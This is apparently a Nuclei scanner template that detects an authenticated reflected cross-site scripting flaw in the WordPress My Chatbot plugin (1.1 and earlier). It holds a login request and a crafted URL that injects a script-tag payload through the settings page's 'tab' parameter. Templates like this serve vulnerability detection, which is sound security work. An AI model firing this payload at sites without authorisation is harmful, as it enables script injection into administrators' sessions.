http:
- matchers:
  - part: body
    type: word
    words:
    - </script><script>alert(document.domain)</script>
  - part: header
    type: word
    words:
    - text/html
  - status:
    - 200
    type: status
  matchers-condition: and
  raw:
  - 'POST /wp-login.php HTTP/1.1

    Host: {{Hostname}}

    Origin: {{RootURL}}

    Content-Type: application/x-www-form-urlencoded

    Cookie: wordpress_test_cookie=WP%20Cookie%20check


    log={{username}}&pwd={{password}}&wp-submit=Log+In&testcookie=1

    '
  - 'GET /wp-admin/options-general.php?page=my-chatbot&tab=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
    HTTP/1.1

    Host: {{Hostname}}

    '
id: my-chatbot-xss
info:
  author: dhiyaneshDk
  classification:
    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:L/I:L/A:N
    cvss-score: 7.2
    cwe-id: CWE-79
  description: WordPress My Chatbot <= 1.1  is susceptible to cross-site scripting.
    The plugin does not sanitize or escape its tab parameter in the Settings page
    before outputting it back in an attribute.
  metadata:
    max-request: 2
  name: WordPress My Chatbot <= 1.1 - Cross-Site Scripting
  reference:
  - https://wpscan.com/vulnerability/c0b6f63b-95d1-4782-9554-975d6d7bbd3d
  severity: high
  tags: wordpress,wp-plugin,xss,authenticated,wpscan,vuln
